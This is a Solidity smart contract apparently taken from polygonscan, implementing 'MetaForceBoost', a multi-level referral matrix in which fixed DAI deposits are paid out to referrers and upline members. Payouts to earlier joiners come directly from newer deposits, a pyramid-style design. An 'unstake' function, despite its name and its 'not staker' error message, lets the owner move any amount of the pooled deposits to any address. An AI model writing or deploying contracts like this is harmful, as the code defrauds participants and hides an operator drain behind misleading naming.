/**
 *Submitted for verification at polygonscan.com on 2023-01-13
*/

/**
 *Submitted for verification at polygonscan.com on 2022-11-30
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract MetaForceBoost {
    using SafeMath for uint256;
    BEP20 public dai = BEP20(0x40819F0145Cf3e5a20c705609693dAF7591A15B8); 
    struct Player {
        address referrer;
        uint256 b6reEntry;
        mapping(uint256 => uint256) b3Entry;
        mapping(uint256 => uint256) b3_level;
        mapping(uint256 => uint256) b6Entry;
        mapping(uint256 => mapping(uint256 => uint256)) b6_level;
        mapping(uint256 => address) b6_upline;
        mapping(uint256 => uint256) b30Entry;
        mapping(uint256 => mapping(uint256 => uint256)) b30_level;
        mapping(uint256 => address) b30_upline;
        mapping(uint256 => uint256) b3Income;
        mapping(uint256 => uint256) b6Direct;
        mapping(uint256 => uint256) b6Income;
        mapping(uint256 => uint256) b30Income;
    }
    mapping(address => Player) public players;
    
    mapping( uint256 =>  address []) public b6;
    mapping( uint256 =>  address []) public b30;
    address owner;
    
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }
    constructor() public {
        owner = msg.sender;
        for(uint8 i=0;i < 8; i++){
            b6[i].push(msg.sender);
            b30[i].push(msg.sender);
        }
    }
    
    function packageInfo(uint256 _pkg) pure private  returns(uint8 p) {
        if(_pkg == 20e18){
            p=1;
        }else if(_pkg == 40e18){
            p=2;
        }else if(_pkg == 80e18){
            p=3;
        }else if(_pkg == 160e18){
            p=4;
        }else if(_pkg == 320e18){
            p=5;
        }else if(_pkg == 640e18){
            p=6;
        }else if(_pkg == 1280e18){
            p=7;
        }else{
            p=0;
        }
        return p;
    }

    function b3deposit(address _refferel, uint256 _dai) public {
        require(_dai >= 10e18, "Invalid Amount");
        uint8 poolNo=packageInfo(_dai);
        require(players[msg.sender].b3Entry[poolNo] == 0, "Already registered");
        dai.transferFrom(msg.sender, address(this), _dai);
        players[msg.sender].referrer=_refferel;
        players[msg.sender].b3Entry[poolNo]++;
        players[_refferel].b3_level[poolNo]++;
        if(players[_refferel].b3_level[poolNo].mod(3) != 0){
            dai.transfer(_refferel,_dai);
            players[_refferel].b3Income[poolNo]+=_dai;
        }else{
            checkB3refer(_refferel,_dai,poolNo);
        }
    }
    function checkB3refer(address _refferel,uint256 _amount,uint256 poolNo) private {
        while(players[_refferel].referrer != address(0)){
            _refferel=players[_refferel].referrer;
            players[_refferel].b3_level[poolNo]++;
            if(players[_refferel].b3_level[poolNo].mod(3) != 0){
                dai.transfer(_refferel,_amount);
                players[_refferel].b3Income[poolNo]+=_amount;
                break;
            }
        }

    }
    function b6deposit(address _refferel, uint256 _amount) public {
        require(_amount >= 10e18, "Invalid Amount");
        uint8 poolNo=packageInfo(_amount);
        require(players[msg.sender].b6Entry[poolNo] == 0, "Already registered");
        dai.transferFrom(msg.sender,address(this),_amount);
        players[msg.sender].b6Entry[poolNo]++;
        b6[poolNo].push(msg.sender);
        _setb6(poolNo,_refferel,msg.sender,_amount);
    }
    function _setb6(uint256 poolNo,address _referral,address _addr,uint256 _amount) private{
        uint256 poollength=b6[poolNo].length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/2; // formula (x-2)/2
        }
        if(players[b6[poolNo][_ref]].b6_level[poolNo][0]<2){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[b6[poolNo][i]].b6_level[poolNo][0]<2){
                   _parent = i;
                   break;
                }
            }
        }
        players[_addr].b6_upline[poolNo]=b6[poolNo][_parent];
        players[b6[poolNo][_parent]].b6_level[poolNo][0]++;
        //referel
        dai.transfer(_referral,_amount.mul(40).div(100));
        players[_referral].b6Direct[poolNo]+=_amount.mul(40).div(100);
        //1st upline
        dai.transfer(b6[poolNo][_parent],_amount.mul(10).div(100));
        players[b6[poolNo][_parent]].b6Income[poolNo]+=_amount.mul(10).div(100);
        //2nd upline
        address up2 = players[b6[poolNo][_parent]].b6_upline[poolNo];
        if(up2 != address(0)){
            players[up2].b6_level[poolNo][1]++;
        
            if((players[up2].b6_level[poolNo][1]==1 || players[up2].b6_level[poolNo][1]==4)){
                
                dai.transfer(up2,_amount.mul(50).div(100));
                players[up2].b6Income[poolNo]+=_amount.mul(50).div(100);
                if(players[up2].b6_level[poolNo][1]==4){
                    b6[poolNo].push(up2);
                    players[up2].b6_level[poolNo][0]=0;
                    players[up2].b6_level[poolNo][1]=0;
                    players[up2].b6reEntry++;
                    _setb6(poolNo,_referral,up2,_amount);
                }
            }
        }
    }
    function b30deposit(uint256 _dai) public {
        require(_dai >= 10e18, "Invalid Amount");
        uint8 poolNo=packageInfo(_dai);
        require(players[msg.sender].b30Entry[poolNo] == 0, "Already registered");
        dai.transferFrom(msg.sender,address(this),_dai);
        players[msg.sender].b30Entry[poolNo]++;
        b30[poolNo].push(msg.sender);
        _setb30(poolNo,msg.sender,_dai);
    }
    function _setb30(uint256 poolNo,address _addr,uint256 _amount) private{
        uint256 poollength=b30[poolNo].length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/2; // formula (x-2)/2
        }
        if(players[b30[poolNo][_ref]].b30_level[poolNo][0]<2){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[b30[poolNo][i]].b30_level[poolNo][0]<2){
                   _parent = i;
                   break;
                }
            }
        }
        players[_addr].b30_upline[poolNo]=b30[poolNo][_parent];
        players[b30[poolNo][_parent]].b30_level[poolNo][0]++;
        //1st upline
        dai.transfer(b30[poolNo][_parent],_amount.mul(10).div(100));
        players[b30[poolNo][_parent]].b30Income[poolNo]+=_amount.mul(10).div(100);
        //2nd upline
        address up2 = players[b30[poolNo][_parent]].b30_upline[poolNo];
        
        if(up2 != address(0)){
            players[up2].b30_level[poolNo][1]++;
            dai.transfer(up2,_amount.mul(15).div(100));
            players[up2].b30Income[poolNo]+=_amount.mul(15).div(100);
        }
        //3rd upline
        address up3 = players[up2].b30_upline[poolNo];
        
        if(up3 != address(0)){
            players[up3].b30_level[poolNo][2]++;
            dai.transfer(up3,_amount.mul(25).div(100));
            players[up3].b30Income[poolNo]+=_amount.mul(25).div(100);
        }
        //4th upline
        address up4 = players[up3].b30_upline[poolNo];
        
        if(up4 != address(0)){
            players[up4].b30_level[poolNo][3]++;
            if(players[up4].b30_level[poolNo][3]<=14){
                dai.transfer(up4,_amount.mul(50).div(100));
                players[up4].b30Income[poolNo]+=_amount.mul(50).div(100);
            }
            if(players[up4].b30_level[poolNo][3]==16){
                b30[poolNo].push(up4);
                players[up4].b30_level[poolNo][0]=0;
                players[up4].b30_level[poolNo][1]=0;
                players[up4].b30_level[poolNo][2]=0;
                players[up4].b30_level[poolNo][3]=0;
                _setb30(poolNo,up4,_amount);
            }
        }
    }
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        dai.transfer(buyer,_amount);
        return _amount;
    }
    function incomeDetails(address _addr) view external returns(uint256[8] memory x3,uint256[8] memory x6dir,uint256[8] memory x6,uint256[8] memory x14) {
        for(uint8 i=0;i<8;i++){
            x3[i]=players[_addr].b3Income[i];
            x6dir[i]=players[_addr].b6Direct[i];
            x6[i]=players[_addr].b6Income[i];
            x14[i]=players[_addr].b30Income[i];
        }
        return (
           x3,
           x6dir,
           x6,
           x14
        );
    }
    function b3Team(address _addr,uint8 pool) view external returns(uint256 p) {
        return (
           players[_addr].b3_level[pool]
        );
    }
    function b6Team(address _addr,uint8 pool) view external returns(uint256[2] memory p) {
        for(uint8 i=0;i<2;i++){
            p[i]=players[_addr].b6_level[pool][i];
        }
        return (
           p
        );
    }
    function b30Team(address _addr,uint8 pool) view external returns(uint256[4] memory p) {
        for(uint8 i=0;i<4;i++){
            p[i]=players[_addr].b30_level[pool][i];
        }
        return (
           p
        );
    }
    function userDetails(address _addr) view external returns(address ref,uint256[8] memory b3e, uint256[8] memory b6e, uint256[8] memory b30e) {
        for(uint8 i=0;i<8;i++){
            b3e[i]=players[_addr].b3Entry[i];
            b6e[i]=players[_addr].b6Entry[i];
            b30e[i]=players[_addr].b30Entry[i];
        }
        return (
           players[_addr].referrer,
           b3e,
           b6e,
           b30e
        );
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}